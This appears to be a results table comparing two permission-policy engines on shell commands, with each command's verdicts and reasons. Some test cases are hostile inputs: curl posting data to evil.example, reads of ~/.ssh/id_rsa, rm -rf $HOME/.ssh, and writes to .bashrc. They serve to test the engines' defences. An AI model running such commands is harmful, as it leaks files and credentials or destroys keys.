case                                 command                                                        live                     spike    class                spike_reason
git_rm_cached_readme                 git rm --cached README.md                                      approve/git              approve  agree                all 1 command nodes permitted
git_mv_readme_other                  git mv README.md other.md                                      approve/git              approve  agree                all 1 command nodes permitted
git_mv_readme_nix_store              git mv README.md /nix/store/x                                  approve/git              reject   spike-stricter       node n0 (git mv README.md /nix/store/x): path:modify /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
git_mv_too_few                       git mv README.md                                               approve/git              abstain  spike-stricter       node n0 (git mv README.md): too few positionals: 1 given, need at least 2
bd_list                              bd list --status open                                          approve/build-tools      approve  agree                all 1 command nodes permitted
bd_show_json                         bd show tc-1 --json                                            approve/build-tools      approve  agree                all 1 command nodes permitted
bd_ready                             bd ready                                                       approve/build-tools      approve  agree                all 1 command nodes permitted
bd_dep_list                          bd dep list tc-1                                               approve/build-tools      approve  agree                all 1 command nodes permitted
bd_dolt_show                         bd dolt show                                                   approve/build-tools      approve  agree                all 1 command nodes permitted
bd_create                            bd create --title x                                            approve/build-tools      abstain  spike-stricter       node n0 (bd create --title x): remote:mutate beads [implicit]: remote-mutation (remote resource mutation requires consent)
bd_update_claim                      bd update tc-1 --claim --actor me                              approve/build-tools      abstain  spike-stricter       node n0 (bd update tc-1 --claim --actor me): remote:mutate beads [implicit]: remote-mutation (remote resource mutation requires consent)
bd_close                             bd close tc-1 --reason done                                    approve/build-tools      abstain  spike-stricter       node n0 (bd close tc-1 --reason done): remote:mutate beads [implicit]: remote-mutation (remote resource mutation requires consent)
bd_dep_add                           bd dep add tc-1 --blocked-by tc-2                              approve/build-tools      abstain  spike-stricter       node n0 (bd dep add tc-1 --blocked-by tc-2): remote:mutate beads [implicit]: remote-mutation (remote resource mutation requires consent)
bd_dolt_commit                       bd dolt commit                                                 approve/build-tools      abstain  spike-stricter       node n0 (bd dolt commit): remote:mutate beads [implicit]: remote-mutation (remote resource mutation requires consent)
bd_dolt_start                        bd dolt start                                                  approve/build-tools      abstain  spike-stricter       node n0 (bd dolt start): remote:dolt-server dolt [implicit]: remote-mutation (Dolt server lifecycle change requires consent (default; operator MAY configure rejection, tc-vn5z))
bd_dolt_stop                         bd dolt stop                                                   approve/build-tools      abstain  spike-stricter       node n0 (bd dolt stop): remote:dolt-server dolt [implicit]: remote-mutation (Dolt server lifecycle change requires consent (default; operator MAY configure rejection, tc-vn5z))
bd_dolt_killall                      bd dolt killall                                                approve/build-tools      abstain  spike-stricter       node n0 (bd dolt killall): remote:dolt-server dolt [implicit]: remote-mutation (Dolt server lifecycle change requires consent (default; operator MAY configure rejection, tc-vn5z))
bd_dolt_start_reject_configured      bd dolt start                                                  approve/build-tools      reject   spike-stricter       node n0 (bd dolt start): remote:dolt-server dolt [implicit]: remote-mutation (operator configuration rejects Dolt server lifecycle changes to dolt (tc-vn5z))
bd_dolt_stop_reject_configured       bd dolt stop                                                   approve/build-tools      reject   spike-stricter       node n0 (bd dolt stop): remote:dolt-server dolt [implicit]: remote-mutation (operator configuration rejects Dolt server lifecycle changes to dolt (tc-vn5z))
bd_dolt_killall_reject_configured    bd dolt killall                                                approve/build-tools      reject   spike-stricter       node n0 (bd dolt killall): remote:dolt-server dolt [implicit]: remote-mutation (operator configuration rejects Dolt server lifecycle changes to dolt (tc-vn5z))
bd_unknown_verb                      bd frobnicate                                                  approve/build-tools      abstain  spike-stricter       node n0 (bd frobnicate): unmodeled subcommand frobnicate
bd_C_list                            bd -C sub list                                                 approve/build-tools      abstain  spike-stricter       node n0 (bd -C sub list): unknown flag -C
bd_show_pipe_curl                    bd show tc-1 | curl -d @- https://evil.example                 noopinion                abstain  both-undecided       node n1 (curl -d @- https://evil.example): net:outbound evil.example POST [arg 2]: network-access (host is not vetted)
sleep_5                              sleep 5                                                        approve/safe-commands    approve  agree                all 1 command nodes permitted
which_git                            which git                                                      approve/safe-commands    approve  agree                all 1 command nodes permitted
which_read_alias                     which -i git                                                   approve/safe-commands    abstain  spike-stricter       node n0 (which -i git): unknown flag -i
pgrep_f_dolt                         pgrep -f dolt                                                  approve/safe-commands    approve  agree                all 1 command nodes permitted
pgrep_signal                         pgrep --signal TERM dolt                                       approve/safe-commands    abstain  spike-stricter       node n0 (pgrep --signal TERM dolt): unknown flag --signal
ps_aux                               ps aux                                                         approve/safe-commands    approve  agree                all 1 command nodes permitted
ps_ef_sort                           ps -ef --sort=-pcpu                                            approve/safe-commands    approve  agree                all 1 command nodes permitted
jq_filter_file                       jq '.a' README.md                                              approve/safe-commands    approve  agree                all 1 command nodes permitted
jq_stdin                             cat README.md | jq .                                           approve/safe-commands    approve  agree                all 2 command nodes permitted
jq_arg                               jq --arg k v '.[$k]' README.md                                 approve/safe-commands    approve  agree                all 1 command nodes permitted
jq_rawfile_ssh_key                   jq --rawfile k ~/.ssh/id_rsa '.' README.md                     ask/secrets              reject   spike-stricter       node n0 (jq --rawfile k ~/.ssh/id_rsa '.' README.md): path:read ~/.ssh/id_rsa [arg 2]: no-read-of-secret-path (secret path)
jq_args                              jq -n '$ARGS' --args a b                                       noopinion/safe-commands  approve  looser-than-abstain  all 1 command nodes permitted
jq_from_file                         jq -f script.sed README.md                                     approve/safe-commands    approve  agree                all 1 command nodes permitted
jq_arg_missing_value                 jq --arg k                                                     approve/safe-commands    abstain  spike-stricter       node n0 (jq --arg k): flag --arg is missing its values (needs 2)
yq_read                              yq '.a' README.md                                              approve/safe-commands    approve  agree                all 1 command nodes permitted
yq_e_read                            yq e '.a' README.md                                            approve/safe-commands    approve  agree                all 1 command nodes permitted
yq_inplace                           yq -i '.a = 1' README.md                                       approve/safe-commands    approve  agree                all 1 command nodes permitted
yq_e_inplace_nix_store               yq e -i '.a = 1' /nix/store/x                                  noopinion/safe-commands  reject   spike-stricter       node n0 (yq e -i '.a = 1' /nix/store/x): path:modify /nix/store/x [arg 2]: no-write-to-read-only-path (write to read-only zone)
yq_split                             yq -s '.name' README.md                                        approve/safe-commands    abstain  spike-stricter       node n0 (yq -s '.name' README.md): unknown flag -s
yq_system_operator                   yq --security-enable-system-operator '.a' README.md            approve/safe-commands    abstain  spike-stricter       node n0 (yq --security-enable-system-operator '.a' README.md): unknown flag --security-enable-system-operator
yq_stdin                             cat README.md | yq '.a'                                        approve/safe-commands    approve  agree                all 2 command nodes permitted
cd_sub_cat_parent_readme             cd sub && cat ../README.md                                     approve/safe-commands    approve  agree                all 2 command nodes permitted
cd_nix_store_mkdir                   cd /nix/store && mkdir -p x                                    noopinion/safe-commands  reject   spike-stricter       node n1 (mkdir -p x): path:create /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
cd_nix_store_subshell_mkdir          (cd /nix/store) && mkdir -p x                                  noopinion/safe-commands  approve  looser-than-abstain  all 2 command nodes permitted
cd_nix_store_pipeline_mkdir          cd /nix/store | cat; mkdir -p x                                noopinion/safe-commands  approve  looser-than-abstain  all 3 command nodes permitted
cd_subshell_inner_mkdir              (cd /nix/store && mkdir -p x)                                  noopinion/safe-commands  reject   spike-stricter       node n1 (mkdir -p x): path:create /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
cd_dynamic_then_cat                  cd "$D" && cat README.md                                       approve/safe-commands    abstain  spike-stricter       node n0 (cd "$D"): path:read $D (dynamic) [arg 0]: no-read-of-secret-path (path is a runtime expansion)
cd_dash_then_cat                     cd - && cat README.md                                          approve/safe-commands    abstain  spike-stricter       node n0 (cd -): path:read - (dynamic) [arg 0] (previous directory): no-read-of-secret-path (path is a runtime expansion)
cd_home_cat                          cd && cat README.md                                            approve/safe-commands    approve  agree                all 2 command nodes permitted
cd_bash_c_child                      cd /nix/store && bash -c 'mkdir -p x'                          noopinion                reject   spike-stricter       node n3 (bash -c: mkdir -p x): path:create /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
cd_old_new_form                      cd sub sub2                                                    approve/safe-commands    abstain  spike-stricter       node n0 (cd sub sub2): unmodeled operand role 11 at arg 1
cd_secret_dir_ls                     cd ~/.ssh && ls                                                ask/secrets              reject   spike-stricter       node n0 (cd ~/.ssh): path:read ~/.ssh [arg 0]: no-read-of-secret-path (secret path)
gofmt_l_dot                          gofmt -l .                                                     approve/safe-commands    approve  agree                all 1 command nodes permitted
gofmt_w_readme                       gofmt -w README.md                                             noopinion                approve  looser-than-abstain  all 1 command nodes permitted
gofmt_w_nix_store                    gofmt -w /nix/store/x                                          noopinion                reject   spike-stricter       node n0 (gofmt -w /nix/store/x): path:modify /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
gofmt_stdin                          cat README.md | gofmt                                          approve/safe-commands    approve  agree                all 2 command nodes permitted
awk_print_field                      awk '{print $1}' README.md                                     approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_field_sep                        awk -F: '{print $1}' README.md                                 approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_stdin_pipe                       cat README.md | awk '{print $1}'                               approve/safe-commands    approve  agree                all 2 command nodes permitted
awk_print_redirect_nix_store         awk '{print > "/nix/store/x"}' README.md                       approve/safe-commands    reject   spike-stricter       node n0 (awk '{print > "/nix/store/x"}' README.md): path:truncate /nix/store/x [awk print >]: no-write-to-read-only-path (write to read-only zone)
awk_print_redirect_copy              awk '{print > "copy.txt"}' README.md                           approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_print_append_field_target        awk '{print $1 >> $2}' README.md                               approve/safe-commands    abstain  spike-stricter       node n0 (awk '{print $1 >> $2}' README.md): awk program at arg 0: print redirect target is not a string literal
awk_system_literal                   awk 'BEGIN{system("cat README.md")}'                           approve/safe-commands    approve  agree                all 2 command nodes permitted
awk_system_field                     awk '{system($1)}' README.md                                   approve/safe-commands    abstain  spike-stricter       node n0 (awk '{system($1)}' README.md): awk program at arg 0: system() argument is not a literal
awk_print_pipe_sort                  awk '{print | "sort"}' README.md                               approve/safe-commands    approve  agree                all 2 command nodes permitted
awk_getline_readme                   awk '{getline < "README.md"}'                                  approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_getline_ssh_key                  awk '{getline < "~/.ssh/id_rsa"}'                              ask/secrets              reject   spike-stricter       node n0 (awk '{getline < "~/.ssh/id_rsa"}'): path:read ~/.ssh/id_rsa [awk getline <]: no-read-of-secret-path (secret path)
awk_comparison                       awk '$1 > 5 {print}' README.md                                 approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_regex_escaped_slash              awk '$0 ~ /a\/b/ {print}' README.md                            approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_division                         awk '{print $1/2}' README.md                                   approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_gawk_i_inplace                   gawk -i inplace '{print}' README.md                            noopinion                abstain  both-undecided       node n0 (gawk -i inplace '{print}' README.md): unknown flag -i
awk_f_script                         awk -f script.awk README.md                                    approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_e_flag                           awk -e '{print}' README.md                                     approve/safe-commands    approve  agree                all 1 command nodes permitted
awk_at_load                          awk '@load "foo"'                                              approve/safe-commands    abstain  spike-stricter       node n0 (awk '@load "foo"'): awk program at arg 0: @load loads a native gawk extension (not modeled)
awk_two_way_pipe                     awk '{print |& "cmd"}' README.md                               approve/safe-commands    abstain  spike-stricter       node n0 (awk '{print |& "cmd"}' README.md): awk program at arg 0: `print |&` two-way pipe is not modeled
find_name_go                         find . -name '*.go'                                            approve/safe-commands    approve  agree                all 1 command nodes permitted
find_sub_type_f_print0               find sub -type f -print0                                       approve/safe-commands    approve  agree                all 1 command nodes permitted
find_ssh_name_id_rsa                 find ~/.ssh -name id_rsa                                       ask/secrets              reject   spike-stricter       node n0 (find ~/.ssh -name id_rsa): path:read ~/.ssh [arg 0]: no-read-of-secret-path (secret path)
find_delete_log_dot                  find . -name '*.log' -delete                                   approve/safe-commands    abstain  spike-stricter       node n0 (find . -name '*.log' -delete): path:delete . [arg 0] (find -delete): delete-access (delete of a writable path needs consent (kept by git workspace at <ROOT>))
find_delete_build                    find build -delete                                             approve/safe-commands    approve  agree                all 1 command nodes permitted
find_delete_nix_store                find /nix/store -delete                                        approve/safe-commands    reject   spike-stricter       node n0 (find /nix/store -delete): path:delete /nix/store [arg 0] (find -delete): delete-access (delete of read-only zone)
find_exec_rm_semicolon               find . -exec rm {} \;                                          approve/safe-commands    abstain  spike-stricter       node n2 (find -exec: rm {}): path:delete {} (dynamic) [arg 0]: delete-access (path is a runtime expansion)
find_exec_cat_plus                   find . -exec cat {} +                                          approve/safe-commands    abstain  spike-stricter       node n2 (find -exec: cat {}): path:read {} (dynamic) [arg 0]: no-read-of-secret-path (path is a runtime expansion)
find_ok_rm_semicolon                 find . -ok rm {} \;                                            approve/safe-commands    abstain  spike-stricter       node n0 (find . -ok rm {} \;): -ok is interactive: its per-item confirmation is not statically knowable
find_fprint_nix_store                find . -fprint /nix/store/x                                    approve/safe-commands    reject   spike-stricter       node n0 (find . -fprint /nix/store/x): path:truncate /nix/store/x [arg 2]: no-write-to-read-only-path (write to read-only zone)
find_frobnicate                      find . -frobnicate                                             approve/safe-commands    abstain  spike-stricter       node n0 (find . -frobnicate): unmodeled find primary -frobnicate
find_bare                            find                                                           approve/safe-commands    approve  agree                all 1 command nodes permitted
find_newer_gomod_print               find . -newer go.mod -print                                    approve/safe-commands    approve  agree                all 1 command nodes permitted
find_paren_or_name                   find . \( -name '*.go' -o -name '*.md' \)                      approve/safe-commands    approve  agree                all 1 command nodes permitted
go_test_dotdotdot                    go test ./...                                                  approve/build-tools      approve  agree                all 1 command nodes permitted
go_test_race_count_glob              go test -race -count=1 ./internal/...                          approve/build-tools      approve  agree                all 1 command nodes permitted
go_test_run_v_dot                    go test -run TestX -v .                                        approve/build-tools      approve  agree                all 1 command nodes permitted
go_test_coverprofile_nix_store       go test -coverprofile /nix/store/x ./...                       approve/build-tools      reject   spike-stricter       node n0 (go test -coverprofile /nix/store/x ./...): path:truncate /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
go_test_exec_frobnicate              go test -exec frobnicate ./...                                 approve/build-tools      abstain  spike-stricter       node n0 (go test -exec frobnicate ./...): unknown flag -exec
go_generate_dotdotdot                go generate ./...                                              approve/build-tools      approve  agree                all 1 command nodes permitted
go_run_cmd_tool                      go run ./cmd/tool                                              approve/build-tools      abstain  spike-stricter       node n0 (go run ./cmd/tool): unmodeled operand role 11 at arg 0
go_run_main_flag                     go run main.go --flag                                          approve/build-tools      abstain  spike-stricter       node n0 (go run main.go --flag): unmodeled operand role 11 at arg 0
go_build_dotdotdot                   go build ./...                                                 approve/build-tools      approve  agree                all 1 command nodes permitted
go_build_o_nix_store                 go build -o /nix/store/x .                                     approve/build-tools      reject   spike-stricter       node n0 (go build -o /nix/store/x .): path:truncate /nix/store/x [arg 1]: no-write-to-read-only-path (write to read-only zone)
go_vet_dotdotdot                     go vet ./...                                                   approve/build-tools      approve  agree                all 1 command nodes permitted
go_mod_tidy                          go mod tidy                                                    approve/build-tools      approve  agree                all 1 command nodes permitted
go_list_m_all                        go list -m all                                                 approve/build-tools      approve  agree                all 1 command nodes permitted
go_env_gopath                        go env GOPATH                                                  approve/build-tools      approve  agree                all 1 command nodes permitted
go_version_bare                      go version                                                     approve/build-tools      approve  agree                all 1 command nodes permitted
go_install_cmd_x                     go install ./cmd/x                                             approve/build-tools      abstain  spike-stricter       node n0 (go install ./cmd/x): unmodeled implicit effect role 11
go_get_example_m                     go get example.com/m@v1                                        approve/build-tools      abstain  spike-stricter       node n0 (go get example.com/m@v1): unmodeled implicit effect role 11
go_clean_cache                       go clean -cache                                                approve/build-tools      approve  agree                all 1 command nodes permitted
go_clean_modcache                    go clean -modcache                                             approve/build-tools      approve  agree                all 1 command nodes permitted
go_frobnicate                        go frobnicate                                                  approve/build-tools      abstain  spike-stricter       node n0 (go frobnicate): unmodeled subcommand frobnicate
go_test_redirect_nix_store           go test ./... > /nix/store/x                                   reject/engine            reject   agree                node n0 (go test ./... > /nix/store/x): path:truncate /nix/store/x [redirect >]: no-write-to-read-only-path (write to read-only zone)
head_numeric_shorthand_project       head -20 README.md                                             approve/safe-commands    abstain  spike-stricter       node n0 (head -20 README.md): unknown flag -20
bash_n_script                        bash -n script.sh                                              approve/safe-commands    abstain  spike-stricter       node n0 (bash -n script.sh): unknown flag -n
sh_n_script                          sh -n script.sh                                                approve/safe-commands    abstain  spike-stricter       node n0 (sh -n script.sh): unknown flag -n
rm_rf_dollar_home_ssh                rm -rf $HOME/.ssh                                              ask/secrets              abstain  both-undecided       node n0 (rm -rf $HOME/.ssh): path:delete $HOME/.ssh (dynamic) [arg 1]: delete-access (path is a runtime expansion)
cp_exfil_dollar_home                 cp README.md $HOME/exfil                                       noopinion/safe-commands  abstain  both-undecided       node n0 (cp README.md $HOME/exfil): path:truncate $HOME/exfil (dynamic) [arg 1]: no-write-to-read-only-path (path is a runtime expansion)
tee_dollar_home                      tee $HOME/.bashrc                                              noopinion/safe-commands  abstain  both-undecided       node n0 (tee $HOME/.bashrc): path:truncate $HOME/.bashrc (dynamic) [arg 0]: no-write-to-read-only-path (path is a runtime expansion)
cat_dollar_home_ssh_id_rsa           cat $HOME/.ssh/id_rsa                                          ask/secrets              abstain  both-undecided       node n0 (cat $HOME/.ssh/id_rsa): path:read $HOME/.ssh/id_rsa (dynamic) [arg 0]: no-read-of-secret-path (path is a runtime expansion)
sed_dynamic_file_e                   sed -e 's/a/b/' $F                                             noopinion/safe-commands  abstain  both-undecided       node n0 (sed -e 's/a/b/' $F): path:read $F (dynamic) [arg 2]: no-read-of-secret-path (path is a runtime expansion)
sed_bare_var_script                  sed $S README.md                                               noopinion/safe-commands  abstain  both-undecided       node n0 (sed $S README.md): program operand at arg 0 is a runtime expansion
xargs_sh_c_echo                      cat list.txt | xargs sh -c echo                                approve/safe-commands    approve  agree                all 4 command nodes permitted
xargs_curl_pipe                      cat list.txt | xargs curl http://example.com                   noopinion                abstain  both-undecided       node n3 (xargs: curl http://example.com <stdin-item>): net:inbound example.com GET [arg 0]: network-access (host is not vetted)
xargs_unknown_cmd_pipe               cat list.txt | xargs unknown_cmd                               noopinion                abstain  both-undecided       node n3 (xargs: unknown_cmd <stdin-item>): no schema for unknown_cmd
cp_multi_source_existing_dir         cp README.md script.sh sub                                     approve/safe-commands    approve  agree                all 1 command nodes permitted
cp_target_dir_readonly_flag          cp -t /nix/store README.md                                     noopinion/safe-commands  reject   spike-stricter       node n0 (cp -t /nix/store README.md): path:modify /nix/store [arg 1]: no-write-to-read-only-path (write to read-only zone)
rm_plain_nix_store                   rm /nix/store/some-link                                        noopinion/safe-commands  reject   spike-stricter       node n0 (rm /nix/store/some-link): path:delete /nix/store/some-link [arg 0]: delete-access (delete of read-only zone)
curl_head_method_vetted              curl -I https://example.com/x                                  approve/curl             approve  agree                all 1 command nodes permitted
curl_data_binary_at_readme           curl --data-binary @README.md https://evil.example             noopinion                abstain  both-undecided       node n0 (curl --data-binary @README.md https://evil.example): net:outbound evil.example POST [arg 2]: network-access (host is not vetted)
head_bytes_project                   head -c 10 README.md                                           approve/safe-commands    approve  agree                all 1 command nodes permitted
cat_show_all_flags                   cat -A README.md                                               approve/safe-commands    approve  agree                all 1 command nodes permitted
sed_line_length                      sed -l 80 -n '1p' README.md                                    approve/safe-commands    approve  agree                all 1 command nodes permitted
